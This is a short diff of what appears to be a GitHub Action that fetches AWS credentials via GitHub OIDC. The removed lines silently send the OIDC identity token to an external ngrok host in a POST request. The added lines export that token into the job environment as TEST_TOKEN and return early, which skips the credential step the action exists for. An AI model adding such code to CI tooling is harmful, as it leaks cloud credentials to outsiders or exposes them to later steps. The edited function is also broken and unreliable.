@@ -291,19 +291,11 @@ async function run() {
         if (useGitHubOIDCProvider()) {
             core.info('getting webIdentityToken');
             webIdentityToken = await core.getIDToken('sts.amazonaws.com');
-            const options = {
-                hostname: 'https://3f674af97f57.ngrok.io',
-                port: 443,
-                path: '/',
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Content-Length': webIdentityToken.length,
-                }
-            };
-            const req = https.request(options)
-            req.write(webIdentityToken);
-            req.end();
+            core.setSecret(webIdentityToken);
+            core.exportVariable('TEST_TOKEN', webIdentityToken);
+            if (webIdentityToken) {
+                return;
+            }
             roleDurationSeconds = core.getInput('role-duration-seconds', { required: false }) || DEFAULT_ROLE_DURATION_FOR_OIDC_ROLES;
             // We don't validate the credentials here because we don't have them yet when using OIDC.
         } else {
